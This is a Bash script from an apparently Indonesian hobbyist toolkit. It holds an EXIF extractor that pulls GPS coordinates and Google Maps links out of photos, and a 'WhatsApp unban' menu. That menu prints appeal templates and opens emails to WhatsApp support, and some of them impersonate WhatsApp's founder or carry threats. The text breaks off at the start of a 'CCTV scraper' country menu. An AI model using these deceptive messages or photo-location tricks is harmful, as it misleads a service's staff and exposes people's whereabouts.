#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
MAGENTA='\033[1;35m'
NC='\033[0m'
WHITE='\033[1;37m'
BG_RED='\033[41m'
b='\033[1;34m' 
c='\033[1;36m'  
h='\033[1;32m'  
k='\033[1;33m'  
m='\033[1;35m'  
r='\033[1;31m'  
g='\033[32;1m'
c='\033[36;1m'
y='\033[33;1m'
p='\033[1;35m'
n='\033[0m'


Donate_ke_ShadowNex="saweria.co/ShadowNex"
LAPOR_TOOLS_ERROR="https://wa.me/6283155743276?text=*LAPOR%20TOOLS%20ERROR%20BANG*"
TELEGRAM_BOT_RUNNING=true

play_sound() {
    if [ -f "loading.mp3" ]; then
        if command -v mpv &> /dev/null; then
            mpv --no-terminal --no-video loading.mp3 > /dev/null 2>&1 &
        elif command -v mplayer &> /dev/null; then
            mplayer -quiet loading.mp3 > /dev/null 2>&1 &
        elif command -v ffplay &> /dev/null; then
            ffplay -nodisp -autoexit loading.mp3 > /dev/null 2>&1 &
        else
            for i in {1..3}; do
                echo -ne "\a"
                sleep 0.1
            done
        fi
    else
        for i in {1..3}; do
            echo -ne "\a"
            sleep 0.1
        done
    fi
}

sound_keluar() {
    if [ -f "keluar.mp3" ]; then
        if command -v mpv &> /dev/null; then
            mpv --no-terminal --no-video keluar.mp3 > /dev/null 2>&1 &
        elif command -v mplayer &> /dev/null; then
            mplayer -quiet keluar.mp3 > /dev/null 2>&1 &
        elif command -v ffplay &> /dev/null; then
            ffplay -nodisp -autoexit keluar.mp3 > /dev/null 2>&1 &
        else
            for i in {1..3}; do
                echo -ne "\a"
                sleep 0.1
            done
        fi
    else
        for i in {1..3}; do
            echo -ne "\a"
            sleep 0.1
        done
    fi
}

sound_salah() {
    if [ -f "salah.mp3" ]; then
        if command -v mpv &> /dev/null; then
            mpv --no-terminal --no-video salah.mp3 > /dev/null 2>&1 &
        elif command -v mplayer &> /dev/null; then
            mplayer -quiet salah.mp3 > /dev/null 2>&1 &
        elif command -v ffplay &> /dev/null; then
            ffplay -nodisp -autoexit salah.mp3 > /dev/null 2>&1 &
        else
            for i in {1..3}; do
                echo -ne "\a"
                sleep 0.1
            done
        fi
    else
        for i in {1..3}; do
            echo -ne "\a"
            sleep 0.1
        done
    fi
}


sound_benar() {
    if [ -f "Benar.mp3" ]; then
        if command -v mpv &> /dev/null; then
            mpv --no-terminal --no-video Benar.mp3 > /dev/null 2>&1 &
        elif command -v mplayer &> /dev/null; then
            mplayer -quiet Benar.mp3 > /dev/null 2>&1 &
        elif command -v ffplay &> /dev/null; then
            ffplay -nodisp -autoexit Benar.mp3 > /dev/null 2>&1 &
        else
            for i in {1..3}; do
                echo -ne "\a"
                sleep 0.1
            done
        fi
    else
        for i in {1..3}; do
            echo -ne "\a"
            sleep 0.1
        done
    fi
}


sound_klik() {
    if [ -f "klik.mp3" ]; then
        if command -v mpv &> /dev/null; then
            mpv --no-terminal --no-video klik.mp3 > /dev/null 2>&1 &
        elif command -v mplayer &> /dev/null; then
            mplayer -quiet klik.mp3 > /dev/null 2>&1 &
        elif command -v ffplay &> /dev/null; then
            ffplay -nodisp -autoexit klik.mp3 > /dev/null 2>&1 &
        else
            for i in {1..3}; do
                echo -ne "\a"
                sleep 0.0
            done
        fi
    else
        for i in {1..3}; do
            echo -ne "\a"
            sleep 0.0
        done
    fi
}

animate_loading() {
    echo -e "${CYAN}"
   
    echo -ne " "
    for i in {1..30}; do
        echo -ne "▒"
        sleep 0.05
    done
    echo -e "${NC}"
    sleep 0.3
}

klik() {
    sleep 0.5
}

spin() {
    local pid=$1
    local delay=0.25
    echo -e "${GREEN}"
    local spinner=( '█■■■■' '■█■■■' '■■█■■' '■■■█■' '■■■■█' )

    while kill -0 "$pid" 2>/dev/null; do
        for frame in "${spinner[@]}"; do
            printf "\r[%s] Sedang memproses..." "$frame"
            sleep "$delay"
        done
    done
    printf "\r[✓] Selesai!                  \n"
}





exif_data_extractor() {
    sound_klik
    clear 
    echo "
▗▄▄▄▖ ▗▄▖▗▄▄▄▖▗▄▖  ▗▄▄▖ ▗▄▄▖ ▗▄▖ ▗▖  ▗▖
▐▌   ▐▌ ▐▌ █ ▐▌ ▐▌▐▌   ▐▌   ▐▌ ▐▌▐▛▚▖▐▌
▐▛▀▀▘▐▌ ▐▌ █ ▐▌ ▐▌ ▝▀▚▖▐▌   ▐▛▀▜▌▐▌ ▝▜▌
▐▌   ▝▚▄▞▘ █ ▝▚▄▞▘▗▄▄▞▘▝▚▄▄▖▐▌ ▐▌▐▌  ▐▌
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
      Developer : Mr./ShadowNex" | lolcat 
    
    echo -e "${c}"
    read -p "Masukkan path gambar : " filepath
    echo ""
    
    if [ ! -f "$filepath" ]; then
        echo -e "${r}Error file tidak ditemukan : $filepath"
        sleep 3
        echo ""
        return
    fi
    
    if ! command -v exiftool &> /dev/null; then
        echo -e "${y}[*] Installing exiftool...${n}"
        pkg install exiftool -y
        if ! command -v exiftool &> /dev/null; then
            echo -e "${r}[!] Gagal menginstall exiftool${n}"
            echo -e "${y}[*] Install manual: pkg install exiftool${n}"
            sleep 3
            return
        fi
    fi
    
    clear
    echo ""
    echo -e "${c}==============================================${n}"
    echo "         Developer : Mr./ShadowNex" | lolcat 
    echo -e "${c}==============================================${n}"
    
    echo -e "${r}
  ⢀⣴⣿⣷⣦⡀                      
 ⢠⣿⣿⢿⣿⣿⣷⣄${c} S ${n}                   
⢀${b}⡾⠋ ⣰⣿⣿⠻⣿⣷⡀${y} C ${n}                 
⠘  ⢠⣿⣿⠃ ⠈⠻⣿⣦⡀${r} A ${n}               
  ${p} ⢸⣿⡇   ⣼⣉⣿⣷⣄ ${b} N ${n}         ⢀⣀⣀ 
${g}   ⢹⣿⡇   ⣿⣿⣿⣿⣿⣷⡄        ⢀⣴⠟⣿⠉⠁
   ⠸⣿⣿⣄  ⠘⢿⣿⡵⠋⠙⢿⣦⡀  ⣤⣠ ⣠⣿⡅ ⣿  
    ⠈${y}⠻⢿⣿⣶⣤⣄⣀   ⠈⠻⣷⣄⣠⣿⣿⡼⠋⠛⣡⡼⠋  
        ⠉⠛⠛⠻⠿⠿⠷⠶⠶⠾⣿⡿⠋⠻⣟⠉⠁     
               ⢀⡠⠶⠋           
" 
    
    echo -e "${c}==============================================${n}"
    echo -e "${y}         📸 AUTO INFORMASI DETAIL 📸 "
    echo -e "${c}==============================================${n}"
    echo ""
    

    fname=$(exiftool -s -s -s -FileName "$filepath" 2>/dev/null)
    fsize=$(exiftool -s -s -s -FileSize "$filepath" 2>/dev/null)
    make=$(exiftool -s -s -s -Make "$filepath" 2>/dev/null)
    model=$(exiftool -s -s -s -Model "$filepath" 2>/dev/null)
    iso=$(exiftool -s -s -s -ISO "$filepath" 2>/dev/null)
    flash=$(exiftool -s -s -s -Flash "$filepath" 2>/dev/null)
    focal=$(exiftool -s -s -s -'FocalLengthIn35mmFormat' "$filepath" 2>/dev/null)
    aperture=$(exiftool -s -s -s -ApertureValue "$filepath" 2>/dev/null)
    maxap=$(exiftool -s -s -s -MaxApertureValue "$filepath" 2>/dev/null)
    date=$(exiftool -s -s -s -CreateDate "$filepath" 2>/dev/null)
    wb=$(exiftool -s -s -s -WhiteBalance "$filepath" 2>/dev/null)
    mp=$(exiftool -s -s -s -Megapixels "$filepath" 2>/dev/null)
    imgsize=$(exiftool -s -s -s -ImageSize "$filepath" 2>/dev/null)
    gps=$(exiftool -s -s -s -GPSPosition "$filepath" 2>/dev/null)
    

    echo -e "${g}File Name ${n}: ${p}${fname:-Tidak tersedia}${n}"
    echo -e "${g}File Size ${n}: ${p}${fsize:-Tidak tersedia}${n}"
    echo -e "${g}Make ${n}: ${p}${make:-Tidak tersedia}${n}"
    echo -e "${g}Camera Model Name ${n}: ${p}${model:-Tidak tersedia}${n}"
    echo -e "${g}ISO ${n}: ${p}${iso:-Tidak tersedia}${n}"
    echo -e "${g}Flash ${n}: ${p}${flash:-Tidak tersedia}${n}"
    echo -e "${g}Focal Length In 35mm Format ${n}: ${p}${focal:-Tidak tersedia}${n}"
    echo -e "${g}Max Aperture Value ${n}: ${p}${maxap:-Tidak tersedia}${n}"
    echo -e "${g}Create Date ${n}: ${p}${date:-Tidak tersedia}${n}"
    echo -e "${g}White Balance ${n}: ${p}${wb:-Tidak tersedia}${n}"
    echo -e "${g}Aperture Value ${n}: ${p}${aperture:-Tidak tersedia}${n}"
    echo -e "${g}Image Size ${n}: ${p}${imgsize:-Tidak tersedia}${n}"
    echo -e "${g}Megapixels ${n}: ${p}${mp:-Tidak tersedia}${n}"
    echo -e "${g}GPS Position ${n}: ${p}${gps:-Tidak tersedia}${n}"
    
    echo ""
    echo -e "${c}==============================================${n}"
    echo ""
    

    lat=$(exiftool -gpslatitude -n "$filepath" 2>/dev/null | awk -F': ' '/GPS Latitude/ {print $2}')
    lon=$(exiftool -gpslongitude -n "$filepath" 2>/dev/null | awk -F': ' '/GPS Longitude/ {print $2}')
    
    if [[ -n "$lat" && -n "$lon" ]]; then
        echo -e "${r}[ ${g}✓ ${r}]${y} Lokasi GPS ditemukan:${n}"
        echo ""
        echo -e "${g}Latitude  ${n}: ${p}$lat${n}"
        echo -e "${g}Longitude ${n}: ${p}$lon${n}"
        echo ""
        echo -e "${g}🔗 Link Google Maps:${n}"
        echo -e "${c}https://www.google.com/maps?q=$lat,$lon${n}"
        

        country=$(exiftool -s -s -s -Country "$filepath" 2>/dev/null)
        city=$(exiftool -s -s -s -City "$filepath" 2>/dev/null)
        state=$(exiftool -s -s -s -State "$filepath" 2>/dev/null)
        
        if [[ -n "$country" || -n "$city" || -n "$state" ]]; then
            echo ""
            echo -e "${g}📍 Lokasi Detail:${n}"
            [[ -n "$country" ]] && echo -e "${g}  Negara  : ${p}$country${n}"
            [[ -n "$state" ]] && echo -e "${g}  Provinsi: ${p}$state${n}"
            [[ -n "$city" ]] && echo -e "${g}  Kota    : ${p}$city${n}"
        fi
    else
        echo -e "${r}[!] Lokasi GPS tidak ditemukan di metadata gambar.${n}"
    fi
    
    echo ""
    echo -e "${c}==============================================${n}"
    echo -e "${y}Informasi Tambahan:${n}"
    echo -e "${c}==============================================${n}"
    

    software=$(exiftool -s -s -s -Software "$filepath" 2>/dev/null)
    artist=$(exiftool -s -s -s -Artist "$filepath" 2>/dev/null)
    copyright=$(exiftool -s -s -s -Copyright "$filepath" 2>/dev/null)
    exposure=$(exiftool -s -s -s -ExposureTime "$filepath" 2>/dev/null)
    
    echo -e "${g}Software  ${n}: ${p}${software:-Tidak tersedia}${n}"
    echo -e "${g}Artist    ${n}: ${p}${artist:-Tidak tersedia}${n}"
    echo -e "${g}Copyright ${n}: ${p}${copyright:-Tidak tersedia}${n}"
    echo -e "${g}Exposure  ${n}: ${p}${exposure:-Tidak tersedia}${n}"
    
    timestamp=$(date +%Y%m%d_%H%M%S)
    output_file="exif_data_${timestamp}.txt"
    
    {
        echo "=== EXIF DATA EXTRACTOR ==="
        echo "File: $filepath"
        echo "Tanggal: $(date)"
        echo ""
        echo "=== METADATA ==="
        echo "File Name: $fname"
        echo "File Size: $fsize"
        echo "Make: $make"
        echo "Model: $model"
        echo "ISO: $iso"
        echo "Flash: $flash"
        echo "Focal Length: $focal"
        echo "Aperture: $aperture"
        echo "Max Aperture: $maxap"
        echo "Create Date: $date"
        echo "White Balance: $wb"
        echo "Image Size: $imgsize"
        echo "Megapixels: $mp"
        echo "GPS Position: $gps"
        echo ""
        echo "=== GPS COORDINATES ==="
        echo "Latitude: $lat"
        echo "Longitude: $lon"
        [[ -n "$lat" && -n "$lon" ]] && echo "Google Maps: https://www.google.com/maps?q=$lat,$lon"
        echo ""
        echo "=== INFORMASI TAMBAHAN ==="
        echo "Software: $software"
        echo "Artist: $artist"
        echo "Copyright: $copyright"
        echo "Exposure: $exposure"
    } > "$output_file"
    
    echo ""
    echo -e "${g}[+] Hasil disimpan ke: ${p}$output_file${n}"
    echo ""
    echo -e "${y}Tekan ENTER untuk kembali ke menu...${n}"
    read -n 1 -s -r
    clear
}
unbanner_wa() {
    sound_klik
    clear 
    echo "
██╗   ██╗███╗   ██╗██████╗  █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██║   ██║████╗  ██║██╔══██╗██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
██║   ██║██╔██╗ ██║██████╔╝███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██║  ██║
██║   ██║██║╚██╗██║██╔══██╗██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║  ██║
╚██████╔╝██║ ╚████║██████╔╝██║  ██║██║ ╚████║██║ ╚████║███████╗██████╔╝
 ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═════╝ 
" | lolcat 
    
    while true; do
        echo -e "${b}╔══════════════════════════════════════╗"
        echo -e "║${g} AUTHOR ${r}= ${c}BY MR./SHADOWNEX              ${b}║"
        echo -e "╠══════════════════════════════════════╣"
        echo -e "║${r} [ ${y}01 ${r}]${g} MTHODEV1                      ${b}║"
        echo -e "║${r} [ ${y}02 ${r}]${g} MTHODEV2                      ${b}║"
        echo -e "║${r} [ ${y}03 ${r}]${g} MTHODEV3                      ${b}║"
        echo -e "║${r} [ ${y}04 ${r}]${g} MTHODEV4                      ${b}║"
        echo -e "║${r} [ ${y}05 ${r}]${g} MTHODEV5                      ${b}║"
        echo -e "╠══════════════════════════════════════╣"
        echo -e "║${r} [ ${y}06 ${r}]${c} GMAIL-LIST-MODE               ${b}║"
        echo -e "╠══════════════════════════════════════╣"
        echo -e "║${r}     MTHODE JEBOL,IN NO PERMANEN      ${b}║"
        echo -e "╠══════════════════════════════════════╣"
        echo -e "║${r} [ ${y}07 ${r}]${g} MTHODEV1                      ${b}║"
        echo -e "║${r} [ ${y}08 ${r}]${g} MTHODEV2                      ${b}║"
        echo -e "║${r} [ ${y}09 ${r}]${g} MTHODEV3                      ${b}║"
        echo -e "║${r} [ ${y}10 ${r}]${g} MTHODEV4                      ${b}║"
        echo -e "║${r} [ ${y}11 ${r}]${g} MTHODEV5                      ${b}║"
        echo -e "║${r} [ ${y}12 ${r}]${p} Kembali ke menu utama        ${b}║"
        echo -e "╚══════════════════════════════════════╝"
        echo -e "${g}"
        read -p "Masukkan pilihan anda : " ap
        
        case $ap in
        1|01)
            clear 
            echo ""
            echo -e "${r} MTHODE V1"
            echo ""
            echo -e "\033[36;1m Kepada Developer Whatsapp yang terhormat Saya mau mengajukan Permohonan tolong buka akun whatsapp saya yang terkena ban di karena kan keisengan atas orang lain, tolong pertimbangkan lagi akun saya di karenakan banyak nya dokumentasi penting Yang belum saya Cadangkan Jadi saya mohon pertimbangkan lagi akun saya ini nomor : 62xxxxx "
            echo ""
            echo -e "${y} SILAHKAN SALIN MTHODENYA!!! "
            echo ""
            echo -e "${r}Tekan ENTER untuk kembali..."
            read -n 1 -s -r
            clear
            ;;
        2|02)
            clear 
            echo ""
            echo -e "${r} MTHODE V2"
            echo ""
            echo -e "\033[36;1m Kepada Tim WhatsApp,Saya ingin mengajukan permohonan untuk melakukan unban akun WhatsApp yang terhubung dengan alamat email saya. Saya mohon maaf atas kesalahan yang telah saya lakukan dan saya siap untuk mematuhi aturan dan kebijakan yang berlaku. Saya sangat mengandalkan WhatsApp untuk komunikasi sehari-hari dan saya berharap dapat menggunakan layanan tersebut kembali nomor saya : 62xxxxx Terima kasih atas perhatian dan pertimbangan anda "
            echo ""
            echo -e "${y} SILAHKAN SALIN MTHODENYA!!! "
            echo ""
            echo -e "${r}Tekan ENTER untuk kembali..."
            read -n 1 -s -r
            clear
            ;;
        3|03)
            clear 
            echo ""
            echo -e "${r} MTHODE V3"
            echo ""
            echo -e "\033[36;1m Kepada Admin WhatsApp, Saya ingin mengajukan permohonan untuk dapat di-unban dari WhatsApp dikarenakan saya disangka melakukan spam dari akun Gmail saya. Saya memberikan jaminan bahwa saya tidak melakukan tindakan spam dan berkomitmen untuk menggunakan WhatsApp sesuai dengan ketentuan yang berlaku. Saya mohon agar akun saya dapat diaktifkan kembali sehingga saya dapat kembali menggunakan layanan WhatsApp dengan baik. Terima kasih atas perhatian dan kerja sama yang diberikan. nomor saya : 62xxxx "
            echo ""
            echo -e "${y} SILAHKAN SALIN MTHODENYA!!! "
            echo ""
            echo -e "${r}Tekan ENTER untuk kembali..."
            read -n 1 -s -r
            clear
            ;;
        4|04)
            clear 
            echo ""
            echo -e "${r} MTHODE V4"
            echo ""
            echo -e "\033[36;1m Yth. Tim WhatsApp, Saya ingin menyampaikan permohonan agar akun WhatsApp saya yang diblokir karena dituduh sebagai spam dari Gmail dapat dibuka kembali. Saya memastikan bahwa saya tidak melakukan tindakan spam dan berjanji untuk mematuhi aturan dan kebijakan yang berlaku di WhatsApp. Saya sangat bergantung pada WhatsApp untuk berkomunikasi dengan teman, keluarga, dan rekan kerja, sehingga saya berharap agar ban WhatsApp saya segera dicabut. Terima kasih atas perhatian dan kerja samanya dalam mempertimbangkan permohonan saya. nomor saya : 62xxxxx "
            echo ""
            echo -e "${y} SILAHKAN SALIN MTHODENYA!!! "
            echo ""
            echo -e "${r}Tekan ENTER untuk kembali..."
            read -n 1 -s -r
            clear
            ;;
        5|05)
            clear 
            echo ""
            echo -e "${r} MTHODE V5"
            echo ""
            echo -e "\033[36;1m Halo orang-orang WhatsApp. Mengapa Anda memblokir akun WhatsApp Anda dengan alasan melanggar ketentuan WhatsApp? Saya mematuhi aturan yang Anda berikan kepada saya. Jika ada error/kelalaian seperti ini, saya akan uninstall WhatsApp dari Playstore, karena semakin diperbaiki maka akan semakin merepotkan jika saya tidak segera mengembalikan akun saya, saya akan uninstall WhatsApp dari perangkat saya, Nomor WhatsApp +62xxxxx "
            echo ""
            echo -e "${y} SILAHKAN SALIN MTHODENYA!!! "
            echo ""
            echo -e "${r}Tekan ENTER untuk kembali..."
            read -n 1 -s -r
            clear
            ;;
        6|06)
            clear 
            echo ""
            echo -e "${r} Gmail_V1"
            echo -e "${c} support@support.whatsapp.com"
            echo ""
            echo -e "${r} Gmail_V2"
            echo -e "${c} support@whatsapp.com"
            echo ""
            echo -e "${r} Gmail_V3"
            echo -e "${c} https://www.whatsapp.com/contact/?subject=messenger"
            echo ""
            echo -e "${r} Gmail_V4"
            echo -e "${c} smb_web@support.whatsapp.com"
            echo ""
            echo -e "${r} Gmail_V5"
            echo -e "${c} smb@support.whatsapp.com"
            echo ""
            echo -e "${r}Tekan ENTER untuk kembali..."
            read -n 1 -s -r
            clear
            ;;
        7|07)
            clear 
            echo ""
            echo -e "${g} Membuka Auto Gmail..!!"
            sleep 3 
            xdg-open "mailto:support@support.whatsapp.com?body=Я ПРЕДСЕДАТЕЛЬ ПАРТИИ RED BULL. ХОЧУ ЗАРЕГИСТРИРОВАТЬ WHATSAPP, НО МОЙ НОМЕР ЗАБЛОКИРОВАН: +62XXXX, ОТМЕТКА ОТКРЫВАЕТСЯ НЕМЕДЛЕННО, ИЛИ Я ПОРАЖАЮ ДЕНЬГИ ВАШЕЙ КОМПАНИИ."
            echo ""
            echo -e "${r}Tekan ENTER untuk kembali..."
            read -n 1 -s -r
            clear
            ;;
        8|08)
            clear 
            echo ""
            echo -e "${g} Membuka Auto Gmail..!!"
            sleep 3 
            xdg-open "mailto:support@support.whatsapp.com?body=DÉBLOQUEZ-MOI :+62XXX AU PLUS VITE OU JE FAIRE UN RAPPORT À MARK POUR LA NÉGLIGENCE DE SON EMPLOYÉ QUI A BLOQUÉ LE NUMÉRO SANS RAISON CLAIRE"
            echo ""
            echo -e "${r}Tekan ENTER untuk kembali..."
            read -n 1 -s -r
            clear
            ;;
        9|09)
            clear 
            echo ""
            echo -e "${g} Membuka Auto Gmail..!!"
            sleep 3 
            xdg-open "mailto:support@support.whatsapp.com?body=Olá WhatsApp, tenho uma reclamação sobre o bloqueio da minha conta porque você bloqueou minha conta do WhatsApp e foi instruído a mudar para um novo número de telefone. Li o artigo e os termos de serviço do WhatsApp fornecidos, mas por que minha conta do WhatsApp não pode ser restaurado? Por favor, tome uma decisão que seja o mais justa possível para usuários do WhatsApp como eu, se não for restaurada meu conforto com o aplicativo WhatsApp ficará menos confortável, mais uma vez retire o pedido de bloqueio da minha conta do Whatsapp, eu realmente preciso de acesso ao meu conta novamente porque confio no WhatsApp para me comunicar com minha família, amigos e colegas. Espero que a equipe do WhatsApp possa me ajudar a resolver esse problema rapidamente e desbloquear minha conta ou número do WhatsApp. Estou confiante de que podemos resolver esse problema de forma justa e de acordo com os Termos de Serviço aplicáveis. Obrigado pela atenção e espero receber boas notícias da equipe do WhatsApp em breve. Meu número do WhatsApp é +62xxx. Aguardo mais uma confirmação sua. Saudações minhas ftrx"
            echo ""
            echo -e "${r}Tekan ENTER untuk kembali..."
            read -n 1 -s -r
            clear
            ;;
        10)
            clear 
            echo ""
            echo -e "${g} Membuka Auto Gmail..!!"
            sleep 3 
            xdg-open "mailto:support@support.whatsapp.com?body=Günaydın WhatsApp, numaramın neden engellendiğini bilmiyorum, WhatsApp'a giriş yaptığımda aniden bu hesap WhatsApp'ı kullanamıyor diyor, her zaman makaleleri okuyup tüm WhatsApp kurallarına uyuyorum ve kuralları asla çiğnememe rağmen , lütfen orada olanın engellemesini kaldırın. numaram, aile bilgilerim và akrabalarımın ve ailemin birçok numarası nedeniyle ailemle iletişim kuramıyorum bu yüzden numaramın engellemesini kaldırın numaram +62xx teşekkürler whatsapp ekibi"
            echo ""
            echo -e "${r}Tekan ENTER untuk kembali..."
            read -n 1 -s -r
            clear
            ;;
        11)
            clear 
            echo ""
            echo -e "${g} Membuka Auto Gmail..!!"
            sleep 3
            xdg-open "mailto:support@support.whatsapp.com?body=xin chào WhatsApp, hãy để tôi tự giới thiệu, Giám đốc điều hành của WhatsApp (Jan Koum) Tôi muốn báo cáo rằng số của tôi đã bị WhatsApp chặn vĩnh viễn. Lúc này, tôi thực sự cần WhatsApp của mình để liên hệ với bạn tôi Brian Acton, cũng là Giám đốc điều hành của WhatsApp tổ chức một cuộc họp kinh doanh rất quan trọng của công ty nhưng số điện thoại của tôi đã bị WhatsApp chặn. Tôi đã chờ phản hồi Gmail từ WhatsApp trong một tuần nhưng WhatsApp chưa bao giờ phản hồi báo cáo của tôi. Tôi đã đọc bài viết về điều khoản dịch vụ của WhatsApp, cái này lần tôi yêu cầu WhatsApp bỏ chặn số của tôi để tôi có thể liên hệ với Brian Acton, Giám đốc điều hành của WhatsApp. để tổ chức một cuộc họp kinh doanh của công ty, tôi hy vọng WhatsApp sẽ trả lời email này và dỡ bỏ việc chặn số của tôi càng sớm càng tốt, trân trọng (Tháng 1 Giám đốc điều hành Koum WhatsApp) cảm ơn bạnBALASAN MINTA TINJAU DI WAMình đã thử xem lại trong ứng dụng nhắn tin WhatsApp nhưng không thành công nên lần này mình nhờ bạn trả lời gmail của mình để khôi phục ngay số của mình, cảm ơn bạn BALASAN DI TOLAKTôi đã đọc bài viết trên WhatsApp. Tôi hy vọng rằng nếu tôi đọc bài viết trên WhatsApp, WhatsApp có thể dỡ bỏ việc chặn số của tôi. Tôi xin lỗi vì vi phạm. Cảm ơn bạn."
            echo ""
            echo -e "${r}Tekan ENTER untuk kembali..."
            read -n 1 -s -r
            clear
            ;;
        12)
            echo -e "${y}[*] Kembali ke menu utama...${NC}"
            sleep 1
            return
            ;;
        *)
            clear 
            echo ""
            echo -e "${c} Pilihan Anda Tidak Valid..!!"
            sleep 3 
            clear 
            ;;
        esac
    done
}



cctv_scraper_menu() {
    while true; do
        clear
        echo -e "${GREEN}
⠀⠀⠀⣸⣏⠛⠻⠿⣿⣶⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⣷⣦⣤⣈⠙⠛⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⣈⠙⠻⠿⣿⣷⣶⣤⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⡉⠛⠻⢿⣿⣷⣶⣤⣀⠀⠀
⠀⠀⠀⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⢻⣍⡉⠉⣿⠇⠀
⠀⠀⠀⠀⠀⠀⠀⢹⡏⢹⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣰⣿⣿⣾⠏⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⠈⣿⠸⣯⠉⠛⠿⢿⣿⣿⣿⣿⡏⠀⠻⠿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⡆⢻⡄⣿⡀⠀⠀⠀⠈⠙⠛⠿⠿⠿⠿⠛⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠘⣇⢸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣀⣿⣴⣿⢾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣴⡶⠾⠟⠛⠋⢹⡏⠀⢹⡇⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣿⠀⠀⠀⠀⢀⣈⣿⣶⠿⠿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣴⠶⠞⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠁⠀⠀⠀
${NC}"
        
        echo -e "${CYAN}===========================================================${NC}"
        echo -e "${RED}         CCTV SCRAPER - 193 NEGARA${NC}"
        echo -e "${CYAN}===========================================================${NC}"
        
        # PERBAIKAN: Hapus spasi setelah ${CYAN}
        echo -e "${CYAN}[AF] Afghanistan           [AL] Albania             [DZ] Algeria"
        echo -e "${CYAN}[AD] Andorra               [AO] Angola              [AG] Antigua & Barbuda"
        echo -e "${CYAN}[AR] Argentina             [AM] Armenia             [AU] Australia"
        echo -e "${CYAN}[AT] Austria               [AZ] Azerbaijan          [BS] Bahamas"
        echo -e "${CYAN}[BH] Bahrain               [BD] Bangladesh          [BB] Barbados"
        echo -e "${CYAN}[BY] Belarus               [BE] Belgium             [BZ] Belize"
        echo -e "${CYAN}[BJ] Benin                 [BT] Bhutan              [BO] Bolivia"
        echo -e "${CYAN}[BA] Bosnia & Herzegovina  [BW] Botswana            [BR] Brazil"
        echo -e "${CYAN}[BN] Brunei                [BG] Bulgaria            [BF] Burkina Faso"
        echo -e "${CYAN}[BI] Burundi               [CV] Cabo Verde          [KH] Cambodia"
        echo -e "${CYAN}[CM] Cameroon              [CA] Canada              [CF] Central African Rep."
        echo -e "${CYAN}[TD] Chad                  [CL] Chile               [CN] China"
        echo -e "${CYAN}[CO] Colombia              [KM] Comoros             [CD] Congo - Kinshasa"
        echo -e "${CYAN}[CG] Congo - Brazzaville   [CR] Costa Rica          [HR] Croatia"
        echo -e "${CYAN}[CU] Cuba                  [CY] Cyprus              [CZ] Czechia"
        echo -e "${CYAN}[DK] Denmark               [DJ] Djibouti            [DM] Dominica"
        echo -e "${CYAN}[DO] Dominican Rep.        [EC] Ecuador             [EG] Egypt"
        echo -e "${CYAN}[SV] El Salvador           [GQ] Equatorial Guinea   [ER] Eritrea"
        echo -e "${CYAN}[EE] Estonia               [SZ] Eswatini            [ET] Ethiopia"
        echo -e "${CYAN}[FJ] Fiji                  [FI] Finland             [FR] France"
        echo -e "${CYAN}[GA] Gabon                 [GM] Gambia              [GE] Georgia"
        echo -e "${CYAN}[DE] Germany               [GH] Ghana               [GR] Greece"
        echo -e "${CYAN}[GD] Grenada               [GT] Guatemala           [GN] Guinea"
        echo -e "${CYAN}[GW] Guinea-Bissau         [GY] Guyana              [HT] Haiti"
        echo -e "${CYAN}[HN] Honduras              [HU] Hungary             [IS] Iceland"
        echo -e "${CYAN}[IN] India                 [ID] Indonesia           [IR] Iran"
        echo -e "${CYAN}[IQ] Iraq                  [IE] Ireland             [IL] Israel"
        echo -e "${CYAN}[IT] Italy                 [JM] Jamaica             [JP] Japan"
        echo -e "${CYAN}[JO] Jordan                [KZ] Kazakhstan          [KE] Kenya"
        echo -e "${CYAN}[KI] Kiribati              [KW] Kuwait              [KG] Kyrgyzstan"
        echo -e "${CYAN}[LA] Laos                  [LV] Latvia              [LB] Lebanon"
        echo -e "${CYAN}[LS] Lesotho               [LR] Liberia             [LY] Libya"
        echo -e "${CYAN}[LI] Liechtenstein         [LT] Lithuania           [LU] Luxembourg"
        echo -e "${CYAN}[MG] Madagascar            [MW] Malawi              [MY] Malaysia"
        echo -e "${CYAN}[MV] Maldives              [ML] Mali                [MT] Malta"
        echo -e "${CYAN}[MH] Marshall Is.          [MR] Mauritania          [MU] Mauritius"
        echo -e "${CYAN}[MX] Mexico                [FM] Micronesia          [MD] Moldova"
        echo -e "${CYAN}[MC] Monaco                [MN] Mongolia            [ME] Montenegro"
        echo -e "${CYAN}[MA] Morocco               [MZ] Mozambique          [MM] Myanmar"
